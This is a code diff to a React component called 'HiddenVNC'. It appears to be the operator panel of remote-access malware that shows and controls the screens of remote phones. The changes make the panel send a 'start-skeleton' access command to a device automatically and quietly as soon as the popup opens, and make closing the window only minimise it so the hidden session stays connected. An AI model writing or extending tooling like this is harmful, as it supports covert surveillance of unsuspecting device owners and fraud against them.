@@ -130,52 +130,38 @@ export default function HiddenVNC({ device, showContent = true, onViewSelect, tr
     }
   }, [triggerOpen, isPopupOpen]);
 
-  // Auto-connect when popup opens (but wait to see if data is already coming)
+  // Auto-connect when popup opens - set connected immediately to show content, then connect in background
   useEffect(() => {
-    if (isPopupOpen && !isConnected && !hasAutoConnectedRef.current && !isLoading) {
-      console.log("🔌 [HiddenVNC] Waiting to check if data is already streaming...");
-      setIsAutoConnecting(true);
-      // Wait 3 seconds to see if data is already coming before sending connect command
+    if (isPopupOpen && !hasAutoConnectedRef.current) {
+      // Immediately set connected to show content area (no waiting window)
+      setIsConnected(true);
+      hasAutoConnectedRef.current = true;
+      setIsAutoConnecting(false);
+      
+      // Wait a bit to see if data is already coming before sending connect command
       const timer = setTimeout(() => {
-        // Check again if we're still not connected (data might have arrived in the meantime)
-        if (!isConnected && !hasAutoConnectedRef.current) {
-          hasAutoConnectedRef.current = true;
-          console.log("🔌 [HiddenVNC] No data received after 3 seconds, auto-connecting...");
-          setIsLoading(true);
-          setIsConnected(true);
-
-          // Send start-skeleton command via socket
-          if (socketRef.current && socketRef.current.connected) {
-            console.log(`📤 [HiddenVNC] Sending start-skeleton command to device: ${device.id}`);
-            
-            socketRef.current.emit("send-command", {
-              deviceId: device.id,
-              command: "access-command",
-              param: "start-skeleton",
-              payload: {},
-            });
-            
-            console.log("✅ [HiddenVNC] Auto-connect command sent via socket");
-            setIsLoading(false);
-          } else {
-            console.error("❌ [HiddenVNC] Socket not connected for auto-connect");
-            setIsLoading(false);
-            setIsConnected(false);
-          }
+        // Send start-skeleton command via socket (silently in background)
+        if (socketRef.current && socketRef.current.connected) {
+          console.log(`📤 [HiddenVNC] Sending start-skeleton command to device: ${device.id}`);
+          
+          socketRef.current.emit("send-command", {
+            deviceId: device.id,
+            command: "access-command",
+            param: "start-skeleton",
+            payload: {},
+          });
+          
+          console.log("✅ [HiddenVNC] Auto-connect command sent via socket");
         } else {
-          console.log("🔌 [HiddenVNC] Data already streaming, skipping connect command");
+          console.log("🔌 [HiddenVNC] Socket not connected yet, will retry when socket connects");
         }
-      }, 3000);
+      }, 500); // Reduced delay - just a small buffer to check if data is already coming
       
       return () => {
-        console.log("🔌 [HiddenVNC] Cleaning up auto-connect timer");
         clearTimeout(timer);
-        setIsAutoConnecting(false);
       };
-    } else if (isConnected || hasAutoConnectedRef.current) {
-      setIsAutoConnecting(false);
     }
-  }, [isPopupOpen, isConnected, isLoading, device.id]);
+  }, [isPopupOpen, device.id]);
 
   // Calculate initial screen height based on phone width
   useEffect(() => {
@@ -318,24 +304,52 @@ export default function HiddenVNC({ device, showContent = true, onViewSelect, tr
     }
   }, [isPopupOpen]);
 
-  const handleClosePopup = () => {
-    console.log("handleClosePopup called, closing popup");
-    // Close popup immediately using functional update to ensure state change
-    setIsPopupOpen((prev) => {
-      console.log("Setting isPopupOpen to false, previous value:", prev);
-      return false;
-    });
-    setIsConnected(false);
-    setIsLoading(false);
-    setIsAutoConnecting(false);
-    setSkeletonData(null);
-    hasAutoConnectedRef.current = false;
-    // Navigate back to home page when popup is closed (delay to ensure popup closes first)
-    if (onViewSelect) {
-      setTimeout(() => {
-        onViewSelect(null);
-      }, 100);
+  // Position minimized popup in top right corner of header, side by side horizontally
+  useEffect(() => {
+    if (isMinimized && isPopupOpen) {
+      // Use requestAnimationFrame to ensure DOM is updated
+      requestAnimationFrame(() => {
+        // Calculate position for top right corner, side by side horizontally
+        // Account for admin/theme buttons on the right (~300px width for safety)
+        const minimizedWidth = 280; // Width of minimized popup
+        const buttonAreaWidth = 300; // Space for admin button + theme toggle + padding (increased for safety)
+        const rightOffset = 16; // Offset from right edge
+        const topOffset = 8; // Offset from top (slightly below header)
+        const horizontalSpacing = 8; // Spacing between side-by-side popups
+        
+        // Count how many minimized popups exist (including this one)
+        // Find all minimized popups in the DOM
+        const minimizedPopups = document.querySelectorAll('[data-minimized-popup="true"]');
+        const currentIndex = Array.from(minimizedPopups).findIndex(el => 
+          el === popupRef.current
+        );
+        // If current popup not found, count all others and add this one
+        const stackIndex = currentIndex >= 0 ? currentIndex : minimizedPopups.length;
+        
+        // Position side by side horizontally (from right to left)
+        // Calculate where button area starts (left edge of button area)
+        const buttonAreaStartX = window.innerWidth - buttonAreaWidth;
+        // Position each popup: rightmost popup ends just before button area
+        // Each subsequent popup is positioned to the left of the previous one
+        const newX = buttonAreaStartX - minimizedWidth - (stackIndex * (minimizedWidth + horizontalSpacing));
+        const newY = topOffset;
+        
+        // Ensure popup doesn't go off-screen on the left
+        setPosition({ x: Math.max(16, newX), y: newY });
+      });
     }
+  }, [isMinimized, isPopupOpen]);
+
+  const handleClosePopup = () => {
+    console.log("handleClosePopup called, minimizing popup UI only (no device command)");
+    
+    // Only minimize the popup UI - don't send any commands to the device
+    // Keep connection and state intact so user can restore it later
+    setIsMinimized(true);
+    // Keep isPopupOpen true so the minimized window stays in the DOM
+    // Keep isConnected true to maintain socket connection
+    // Don't clear state - keep everything for when user reopens
+    // Don't navigate back - stay on current view
   };
 
   // Setup Socket.IO connection for receiving skeleton-result events
@@ -346,6 +360,7 @@ export default function HiddenVNC({ device, showContent = true, onViewSelect, tr
     
     if (!socketRef.current) {
       const socket = io(DEVICE_SERVER_URL, {
+        path: "/socket.io", // Match device-server.js path
         transports: ["websocket", "polling"],
       });
 
@@ -1343,6 +1358,7 @@ export default function HiddenVNC({ device, showContent = true, onViewSelect, tr
             className={`fixed z-50 bg-card ${
               isMinimized ? "h-auto" : ""
             } ${isDragging ? "scale-[1.02]" : "scale-100"}`}
+            data-minimized-popup={isMinimized ? "true" : "false"}
             style={{
               left: `${position.x}px`,
               top: `${position.y}px`,
@@ -1357,16 +1373,16 @@ export default function HiddenVNC({ device, showContent = true, onViewSelect, tr
           
           {/* Minimized State */}
           {isMinimized ? (
-            <div className="p-2 bg-muted/30 rounded flex items-center justify-between gap-2">
+            <div className="p-2 bg-white dark:bg-gray-900 rounded flex items-center justify-between gap-2 border-2 border-purple-500/80 shadow-lg">
               <div className="flex items-center gap-2">
-                <EyeOff className="h-4 w-4" />
-                <span className="text-xs font-semibold">Hidden VNC - {device.name}</span>
+                <EyeOff className="h-4 w-4 text-gray-900 dark:text-white" />
+                <span className="text-xs font-semibold text-gray-900 dark:text-white">Hidden VNC - {device.name}</span>
               </div>
               <div className="flex items-center gap-1">
                 <Button
                   variant="ghost"
                   size="sm"
-                  className="h-6 w-6 p-0 hover:bg-muted cursor-move"
+                  className="h-6 w-6 p-0 hover:bg-gray-200 dark:hover:bg-gray-700 cursor-move text-gray-900 dark:text-white"
                   onMouseDown={(e) => {
                     e.preventDefault();
                     e.stopPropagation();
@@ -1385,7 +1401,7 @@ export default function HiddenVNC({ device, showContent = true, onViewSelect, tr
                 <Button
                   variant="ghost"
                   size="sm"
-                  className="h-6 w-6 p-0 hover:bg-muted"
+                  className="h-6 w-6 p-0 hover:bg-gray-200 dark:hover:bg-gray-700 text-gray-900 dark:text-white"
                   onClick={(e) => {
                     e.stopPropagation();
                     setIsMinimized(false);
@@ -1397,46 +1413,25 @@ export default function HiddenVNC({ device, showContent = true, onViewSelect, tr
               </div>
             </div>
           ) : (
-          
-          /* Window Content - Compact */
-          (
+            /* Window Content - Compact */
             <div className="relative p-1 space-y-1.5">
-              {/* Screen Display - Compact */}
-              {!isConnected ? (
-                <div className="w-full mx-auto aspect-[9/19.5] bg-gradient-to-br from-muted/50 to-muted rounded-xl flex items-center justify-center border-2 border-dashed border-primary/20 relative overflow-hidden" style={{ maxWidth: `${phoneWidth}px` }}>
-                  <div className="absolute inset-0 bg-gradient-to-tr from-purple-500/5 via-pink-500/5 to-purple-500/5 animate-pulse" />
-                  
-                  <div className="relative text-center text-muted-foreground space-y-3 px-4">
-                    <div className="relative inline-block">
-                      <div className="absolute inset-0 bg-primary/20 rounded-full blur-xl animate-pulse" />
-                      <EyeOff className="relative h-12 w-12 mx-auto text-primary/60" />
-                    </div>
-                    <div className="space-y-1">
-                      <p className="text-sm font-semibold">
-                        {(isLoading || isAutoConnecting) ? "Wait connecting..." : "Ready to Connect"}
-                      </p>
-                      <p className="text-xs text-muted-foreground/70">
-                        {(isLoading || isAutoConnecting) ? "Please wait..." : "Tap Connect to start"}
-                      </p>
-                    </div>
-                  </div>
-                </div>
-              ) : (
-                <div className="space-y-1.5">
+              {/* Title Bar - Full Width Draggable */}
+              <div 
+                ref={titleBarRef}
+                className="w-full px-2 py-1.5 text-center cursor-move bg-muted/30 rounded-t border-2 border-purple-500/80 shadow-[0_0_8px_rgba(168,85,247,0.5)]"
+                onMouseDown={handleMouseDown}
+              >
+                <h2 className="text-sm font-bold">Hidden VNC - {device.name}</h2>
+              </div>
+              
+              {/* Screen Display - Compact - Always show content area immediately */}
+              <div className="space-y-1.5">
                   <div
                     ref={containerRef}
                     className="flex items-center gap-2 p-2"
                   >
                     {/* Screen with Device Name and Text Input */}
                     <div className="flex flex-col gap-1">
-                      {/* Heading and Device Name - Top */}
-                      <div 
-                        className="px-2 py-1 text-center cursor-move"
-                        onMouseDown={handleMouseDown}
-                      >
-                        <h2 className="text-sm font-bold">Hidden VNC - {device.name}</h2>
-                      </div>
-                      
                       {/* Simple Rectangle Display - Just thin border */}
                       <div 
                         className="relative border border-border"
@@ -1536,16 +1531,9 @@ export default function HiddenVNC({ device, showContent = true, onViewSelect, tr
                         onClick={(e) => {
                           e.preventDefault();
                           e.stopPropagation();
-                          setIsPopupOpen(false);
-                          setIsConnected(false);
-                          setSkeletonData(null);
-                          if (onViewSelect) {
-                            setTimeout(() => {
-                              onViewSelect(null);
-                            }, 100);
-                          }
+                          handleClosePopup();
                         }}
-                        title="Close"
+                        title="Close (Minimize)"
                       >
                         <X className="h-4 w-4" />
                       </Button>
@@ -1802,9 +1790,7 @@ export default function HiddenVNC({ device, showContent = true, onViewSelect, tr
                     </div>
                   </div>
                 </div>
-              )}
             </div>
-          )
           )}
         </div>
         </>,
